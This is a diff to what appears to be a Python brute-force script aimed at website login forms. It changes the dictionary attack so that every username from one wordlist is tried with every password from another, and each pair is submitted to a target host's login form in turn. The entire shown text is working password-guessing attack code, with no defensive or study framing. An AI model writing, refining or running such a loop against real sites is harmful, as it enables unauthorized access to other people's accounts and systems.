@@ -78,14 +78,18 @@ def clear_fields():
     find_and_fill("", passwordinput)
 
 def dictionary_method():
-    f = open(admin, "r")
-    for line in f:
-        connect_to_website(host)
-        find_and_fill(line.strip(), admininput)
-        find_and_fill(password, passwordinput)
-        time.sleep(2)
-        submit_form()
-          
+    logins_list = open(admin, "r")
+    passwords_list = open(password, "r")
+    for line in logins_list:
+        print(line)
+        for pass_el in passwords_list:
+            print(pass_el)
+            connect_to_website(host)
+            find_and_fill(line.strip(), admininput)
+            find_and_fill(pass_el.strip(), passwordinput)
+            time.sleep(2)
+            submit_form()
+        passwords_list.seek(0)
             
             
         
